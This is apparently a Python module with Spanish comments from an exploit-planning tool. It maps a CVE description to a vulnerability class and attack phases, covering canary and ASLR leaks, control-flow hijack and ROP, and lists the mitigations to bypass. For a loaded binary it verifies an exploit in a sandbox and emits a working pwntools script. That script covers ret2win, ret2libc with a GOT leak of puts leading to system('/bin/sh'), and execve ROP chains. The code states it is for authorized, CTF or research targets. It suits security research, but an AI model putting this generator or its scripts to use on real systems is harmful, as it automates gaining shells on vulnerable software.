"""Planificador de explotacion (esquema) a partir de una CVE / clase de vulnerabilidad.

Objetivo: dado el texto o el id de una CVE (o una descripcion de la vulnerabilidad), y opcionalmente
los hechos de un binario cargado, producir un ESQUEMA de explotacion paso a paso: clase de la
vulnerabilidad -> primitiva que concede -> fases (fuga, control, gadgets, objetivo) -> mitigaciones a
sortear. Es "a la inversa": de la vulnerabilidad al exploit.

NO es un exploit generado a ciegas: es un plan tecnico y grounded. Si se pasa un binario, el plan se
concreta con sus mitigaciones (checksec) y con el Analizador de cadenas. El conocimiento de tecnicas
sale del RAG (ver kb: rop/heap/format-string/syscalls-seccomp/ctf-techniques). Solo para objetivos
AUTORIZADOS / CTF / research.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import List, Optional


@dataclass
class Phase:
    name: str          # nombre de la fase
    goal: str          # que se consigue
    technique: str     # como (tecnica concreta)
    needs: str = ""    # que hace falta / precondicion


@dataclass
class ExploitPlan:
    vuln_class: str = ""
    cve: str = ""
    primitive: str = ""            # que primitiva concede la vuln
    phases: List[Phase] = field(default_factory=list)
    mitigations: List[str] = field(default_factory=list)   # a sortear (y como)
    kb_refs: List[str] = field(default_factory=list)       # cheat sheets del RAG relevantes
    note: str = ""
    # concrecion con un binario cargado (si se pasa)
    concrete: dict = field(default_factory=dict)   # {offset, gadgets, win, system, chain}
    verified: bool = False                          # exploit verificado por ejecucion en sandbox
    proof: dict = field(default_factory=dict)       # {strategy, offset, base, win, marker, output}
    script: str = ""                                # script pwntools reproducible (si hay verificado)

    @property
    def ok(self) -> bool:
        return bool(self.vuln_class)


# clase de vulnerabilidad -> (palabras clave, primitiva, refs kb)
_CLASSES = [
    ("stack-overflow", ("stack buffer overflow", "stack-based buffer overflow", "desbordamiento de pila",
                        "stack overflow", "gets(", "strcpy", "stack smashing"),
     "control de RIP (sobrescribe la direccion de retorno guardada)", ["ret2win", "rop", "ret2libc", "canary-bypass"]),
    ("heap-overflow", ("heap buffer overflow", "heap-based overflow", "desbordamiento de heap",
                       "heap overflow", "chunk overflow"),
     "corrupcion de metadatos de heap (pisa cabeceras/punteros de chunk adyacente)", ["heap", "modern-heap", "heap-grooming"]),
    ("uaf", ("use-after-free", "use after free", "uso despues de liberar", "dangling pointer"),
     "puntero colgante -> escritura/lectura en objeto liberado (tcache poisoning)", ["uaf-typeconfusion", "heap", "modern-heap"]),
    ("double-free", ("double free", "double-free", "doble liberacion"),
     "corrupcion de la tcache/fastbin -> arbitrary alloc", ["heap", "modern-heap"]),
    ("format-string", ("format string", "format-string", "cadena de formato", "uncontrolled format string",
                       "printf(", "%n"),
     "lectura y ESCRITURA arbitraria (%n) via argumentos de printf", ["format-string", "got-plt"]),
    ("oob-write", ("out-of-bounds write", "oob write", "escritura fuera de limites", "index out of bounds"),
     "escritura fuera de limites (write-what-where acotado)", ["mitigations", "got-plt"]),
    ("oob-read", ("out-of-bounds read", "oob read", "lectura fuera de limites", "over-read", "info leak"),
     "fuga de informacion (leak de punteros -> derrota ASLR)", ["mitigations", "ret2libc"]),
    ("type-confusion", ("type confusion", "confusion de tipos"),
     "confusion de tipos -> control de vtable/punteros de funcion", ["uaf-typeconfusion", "browser-v8"]),
    ("integer-overflow", ("integer overflow", "desbordamiento de entero", "integer underflow", "signedness"),
     "tamano/indice erroneo -> overflow o OOB secundario", ["integer-bugs"]),
    ("race", ("race condition", "toctou", "time-of-check", "condicion de carrera", "double fetch"),
     "ventana de carrera -> estado inconsistente (p.ej. escalada/ficheros)", ["race-conditions"]),
]


def classify_cve(text: str) -> Optional[str]:
    t = (text or "").lower()
    for cls, kws, _prim, _refs in _CLASSES:
        if any(k in t for k in kws):
            return cls
    return None


def _mem_phases(cls: str, facts: dict, es: bool) -> List[Phase]:
    """Fases para corrupcion de memoria, concretadas con las mitigaciones del binario si se dan."""
    pie = facts.get("pie") is True
    nx = facts.get("nx") is not False
    canary = facts.get("canary") is True
    P = []
    if canary:
        P.append(Phase(
            "Fuga del canary" if es else "Canary leak",
            "obtener el valor del stack canary" if es else "obtain the stack canary",
            "leak por OOB-read / format-string / fuga parcial; sin fuga, el overflow lineal se detecta"
            if es else "leak via OOB-read / format-string / partial disclosure; without it the linear "
            "overflow is caught",
            "una primitiva de lectura o un %x/%s controlado" if es else "a read primitive or a controlled %x/%s"))
    if pie:
        P.append(Phase(
            "Fuga de dirreccion (derrotar PIE/ASLR)" if es else "Address leak (defeat PIE/ASLR)",
            "resolver la base del binario/libc" if es else "resolve the binary/libc base",
            "leak de un puntero conocido (GOT/retorno/environ) para rebasar" if es else
            "leak a known pointer (GOT/return/environ) to rebase",
            "un leak (OOB-read, format-string, puts(GOT))" if es else "a leak (OOB-read, format-string, puts(GOT))"))
    P.append(Phase(
        "Control del flujo" if es else "Control-flow hijack",
        "controlar RIP (o un puntero de funcion/vtable)" if es else "control RIP (or a function pointer/vtable)",
        ("sobrescribir la direccion de retorno guardada tras el offset" if cls == "stack-overflow" else
         "envenenar tcache/fastbin o pisar un puntero de funcion") if es else
        ("overwrite the saved return address past the offset" if cls == "stack-overflow" else
         "poison tcache/fastbin or clobber a function pointer"),
        "el offset a RIP (o el layout del heap)" if es else "the offset to RIP (or the heap layout)"))
    if nx:
        P.append(Phase(
            "Construir la cadena (ROP)" if es else "Build the chain (ROP)",
            "reutilizar codigo: encadenar gadgets" if es else "reuse code: chain gadgets",
            "ret2libc system('/bin/sh') o execve por syscall; SROP si faltan gadgets" if es else
            "ret2libc system('/bin/sh') or execve via syscall; SROP if gadgets are scarce",
            "gadgets `pop rdi; ret`, `syscall` y '/bin/sh' (o libc con leak)" if es else
            "`pop rdi; ret`, `syscall` gadgets and '/bin/sh' (or leaked libc)"))
    else:
        P.append(Phase(
            "Shellcode" if es else "Shellcode",
            "ejecutar shellcode inyectado" if es else "run injected shellcode",
            "NX desactivado: salta a la pila/heap con el shellcode" if es else
            "NX off: jump to the stack/heap holding the shellcode", ""))
    P.append(Phase(
        "Objetivo" if es else "Target",
        "shell / lectura de flag / RCE" if es else "shell / flag read / RCE",
        "system('/bin/sh'), execve, o open+read+write del flag (si hay seccomp)" if es else
        "system('/bin/sh'), execve, or open+read+write the flag (under seccomp)", ""))
    return P


def _generic_phases(cls: str, es: bool) -> List[Phase]:
    return [
        Phase("Reconocimiento" if es else "Recon", "entender la vulnerabilidad y su alcance" if es else
              "understand the vulnerability and its reach",
              "localizar el codigo afectado, la entrada que lo dispara y las mitigaciones" if es else
              "locate the affected code, the triggering input and the mitigations"),
        Phase("Primitiva" if es else "Primitive", "convertir el bug en una primitiva util" if es else
              "turn the bug into a useful primitive",
              "leer/escribir controlado, corrupcion de estado, o fuga" if es else
              "controlled read/write, state corruption, or leak"),
        Phase("Objetivo" if es else "Target", "impacto: RCE / fuga / escalada" if es else
              "impact: RCE / leak / escalation",
              "encadenar la primitiva hasta el objetivo del ejercicio" if es else
              "chain the primitive to the exercise goal"),
    ]


def plan(text: str, facts: Optional[dict] = None, cve: str = "", lang: str = "es") -> ExploitPlan:
    """Construye el esquema de explotacion para la CVE/descripcion. `facts` (checksec del binario)
    concreta las mitigaciones. No lanza."""
    es = lang == "es"
    facts = facts or {}
    cls = classify_cve(text) or classify_cve(cve)
    if not cls:
        return ExploitPlan(note=("no se reconocio la clase de vulnerabilidad en el texto"
                                 if es else "vulnerability class not recognized in the text"))
    prim = next((p for c, _k, p, _r in _CLASSES if c == cls), "")
    refs = next((r for c, _k, _p, r in _CLASSES if c == cls), [])
    pl = ExploitPlan(vuln_class=cls, cve=cve, primitive=prim, kb_refs=refs)
    mem = cls in ("stack-overflow", "heap-overflow", "uaf", "double-free", "format-string",
                  "oob-write", "type-confusion")
    pl.phases = _mem_phases(cls, facts, es) if mem else _generic_phases(cls, es)
    # mitigaciones a sortear (concretadas si hay facts)
    if facts:
        for k, on, how_es, how_en in (
            ("canary", facts.get("canary") is True, "hay canary -> necesitas fugarlo o brute (fork)",
             "canary present -> leak or brute-force it (fork)"),
            ("pie", facts.get("pie") is True, "PIE/ASLR -> necesitas un leak de la base",
             "PIE/ASLR -> you need a base leak"),
            ("nx", facts.get("nx") is not False, "NX -> reutiliza codigo (ROP/ret2libc), no shellcode",
             "NX -> reuse code (ROP/ret2libc), not shellcode"),
            ("relro", str(facts.get("relro", "")).lower() == "full",
             "Full RELRO -> sin GOT overwrite: usa FSOP/__free_hook/exit-handlers",
             "Full RELRO -> no GOT overwrite: use FSOP/__free_hook/exit-handlers")):
            if on:
                pl.mitigations.append(how_es if es else how_en)
    return pl


def _pwn_script_from_proof(proof: dict, name: str = "target") -> str:
    """Script pwntools reproducible a partir de la prueba de una cadena verificada."""
    strat = (proof.get("strategy") or "").lower()
    off = proof.get("offset")
    win = proof.get("win")
    base = proof.get("base")
    H = ["#!/usr/bin/env python3",
         "# binoracle: exploit reproducible - SOLO laboratorio/CTF autorizado",
         f"# estrategia VERIFICADA: {strat}",
         "from pwn import *",
         "context.update(arch='amd64', os='linux')",
         f"BINARY = './{name}'",
         "elf = context.binary = ELF(BINARY, checksec=False)",
         "io = process(BINARY)   # o: remote('HOST', PORT)"]
    if off is None:
        return "\n".join(H + ["# offset no resuelto"])
    if "ret2win" in strat:
        B = [f"OFFSET = {off}", "ret = next(elf.search(asm('ret'), executable=True), 0)",
             f"payload = flat({{OFFSET: [ret, {win}]}})", "io.sendline(payload)", "io.interactive()"]
    elif "leak" in strat:
        B = [f"OFFSET = {off}", "rop = ROP(elf)", "rop.raw(rop.find_gadget(['ret']).address)",
             "rop.puts(elf.got['puts']); rop.call(elf.sym['main'])",
             "io.sendline(flat({OFFSET: rop.chain()}))",
             "leak = u64(io.recvline().strip().ljust(8, b'\\x00'))",
             "libc = elf.libc; libc.address = leak - libc.sym['puts']",
             "rop2 = ROP(libc); rop2.system(next(libc.search(b'/bin/sh\\x00')))",
             "io.sendline(flat({OFFSET: rop2.chain()}))", "io.interactive()"]
    elif "pie" in strat:
        B = [f"OFFSET = {off}", f"elf.address = {base or 0}  # sandbox ASLR-off (con ASLR real: leak)",
             "binsh = next(elf.search(b'/bin/sh\\x00'), 0)", "rop = ROP(elf)",
             "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
             "rop.call(sysaddr, [binsh]) if sysaddr else rop.execve(binsh, 0, 0)",
             "io.sendline(b'A'*OFFSET + rop.chain())", "io.interactive()"]
    else:
        B = [f"OFFSET = {off}", "binsh = next(elf.search(b'/bin/sh\\x00'), 0)", "rop = ROP(elf)",
             "sysaddr = elf.plt.get('system') or elf.sym.get('system')",
             "rop.raw(rop.find_gadget(['ret']).address)",
             "rop.call(sysaddr, [binsh]) if (sysaddr and binsh) else rop.execve(binsh, 0, 0)",
             "io.sendline(flat({OFFSET: rop.chain()}))", "io.interactive()"]
    return "\n".join(H + B)


def plan_from_analysis(an, facts: dict, binary_name: str = "target", text: str = "",
                       cve: str = "", lang: str = "es") -> ExploitPlan:
    """Construye el esquema a partir de un ChainAnalysis YA calculado (sin re-ejecutar el sandbox).
    Para el informe/audit, que ya corre analyze_chains con verify. Concreta offset/gadgets/objetivo
    y, si hay cadena verificada, adjunta prueba + script pwntools."""
    import os
    es = lang == "es"
    cls = classify_cve(text) or classify_cve(cve)
    if not cls and an is not None and getattr(an, "control", {}).get("RIP"):
        cls = "stack-overflow"
    if not cls:
        return plan(text or cve, facts, cve=cve, lang=lang)
    pl = plan(text or ("stack overflow" if cls == "stack-overflow" else cls), facts, cve=cve, lang=lang)
    pl.vuln_class = cls
    if an is not None:
        ctrl = an.control
        gd = ctrl.get("reg_gadgets") or {}
        pl.concrete = {"offset": ctrl.get("rip_offset"),
                       "reg_gadgets": {k: v.get("addr") for k, v in gd.items()},
                       "pivot": ctrl.get("pivot_gadget"), "target": an.target,
                       "gadgets_total": len(an.gadgets)}
        vc = next((c for c in an.chains if getattr(c, "verified", False)), None)
        if vc is not None:
            pl.verified = True
            pl.proof = vc.proof or {}
            pl.concrete["chain"] = vc.name
            pl.script = _pwn_script_from_proof(pl.proof, os.path.basename(binary_name))
            pl.phases.append(Phase(
                "Exploit VERIFICADO" if es else "VERIFIED exploit",
                (f"cadena {vc.name} ejecutada en sandbox -> objetivo alcanzado" if es else
                 f"chain {vc.name} executed in sandbox -> goal reached"),
                (f"prueba: {'  '.join(f'{k}={v}' for k, v in pl.proof.items() if k != 'output' and v)}"),
                "script pwntools adjunto" if es else "attached pwntools script"))
    return pl


def plan_for_binary(binary: str, text: str = "", cve: str = "", lang: str = "es",
                    verify: bool = True) -> ExploitPlan:
    """Concreta el esquema con un binario cargado: rellena offset/gadgets/objetivo reales via el
    Analizador de cadenas y, si `verify`, VERIFICA el exploit en sandbox (script + prueba). Si no se
    da `text`, infiere la clase (overflow -> control de RIP) de los hechos del binario."""
    import os
    es = lang == "es"
    facts = {}
    an = None
    try:
        from ..oracles import build_registry
        reg = build_registry(binary)
        cs = reg.get("r2_checksec")
        r = cs.run() if cs else None
        if r and r.ok:
            facts = {"nx": r.meta.get("nx"), "pie": r.meta.get("pic"),
                     "canary": r.meta.get("canary"), "relro": r.meta.get("relro")}
    except Exception:
        pass
    try:
        from .chainanalyzer import analyze_chains
        an = analyze_chains(binary, None, verify=verify, lang=lang)
    except Exception:
        an = None
    return plan_from_analysis(an, facts, binary_name=os.path.basename(binary), text=text,
                              cve=cve, lang=lang)


def render_plan(pl: ExploitPlan, lang: str = "es") -> str:
    es = lang == "es"
    if not pl.ok:
        return ("## Plan de explotacion\n\n" + (pl.note or ""))
    out = ["## " + ("Esquema de explotacion" if es else "Exploitation schema") +
           (f": {pl.cve}" if pl.cve else "")]
    out.append((f"- **Clase**: {pl.vuln_class}\n- **Primitiva**: {pl.primitive}" if es else
                f"- **Class**: {pl.vuln_class}\n- **Primitive**: {pl.primitive}"))
    # concrecion con el binario cargado (datos reales)
    if pl.concrete:
        c = pl.concrete
        cl = [("**Concreto (binario)**:" if es else "**Concrete (binary)**:")]
        if c.get("offset") is not None:
            cl.append(("  - offset a RIP: " if es else "  - RIP offset: ") + f"`{c['offset']}`")
        if c.get("reg_gadgets"):
            cl.append("  - gadgets: " + ", ".join(f"{k.upper()}@`{v}`" for k, v in c["reg_gadgets"].items()))
        if c.get("pivot"):
            cl.append("  - pivot RSP: `" + str(c["pivot"]) + "`")
        cl.append(("  - objetivo: " if es else "  - target: ") + f"`{c.get('target','?')}`"
                  + f" ({c.get('gadgets_total',0)} gadgets)")
        out.append("\n".join(cl))
    if pl.verified:
        out.append(("\n> **EXPLOIT VERIFICADO** por ejecucion en sandbox: cadena "
                    f"`{pl.concrete.get('chain','?')}`, "
                    + "  ".join(f"{k}={v}" for k, v in pl.proof.items() if k != "output" and v)
                    if es else
                    "\n> **VERIFIED EXPLOIT** by sandbox execution: chain "
                    f"`{pl.concrete.get('chain','?')}`, "
                    + "  ".join(f"{k}={v}" for k, v in pl.proof.items() if k != "output" and v)))
    out.append("\n### " + ("Fases" if es else "Phases"))
    for i, ph in enumerate(pl.phases, 1):
        out.append(f"{i}. **{ph.name}**: {ph.goal}\n   - " + ("como" if es else "how") + f": {ph.technique}"
                   + (f"\n   - " + ("necesita" if es else "needs") + f": {ph.needs}" if ph.needs else ""))
    if pl.mitigations:
        out.append("\n### " + ("Mitigaciones a sortear" if es else "Mitigations to bypass"))
        out += [f"- {m}" for m in pl.mitigations]
    if pl.kb_refs:
        out.append("\n" + ("Referencias del conocimiento (RAG): " if es else "Knowledge refs (RAG): ")
                   + ", ".join(pl.kb_refs))
    if pl.script:
        out.append("\n### " + ("Exploit reproducible (pwntools)" if es else "Reproducible exploit (pwntools)")
                   + "\n```python\n" + pl.script + "\n```")
    out.append("\n_" + ("Solo objetivos autorizados / CTF / research." if es else
                        "Authorized / CTF / research targets only.") + "_")
    return "\n".join(out)
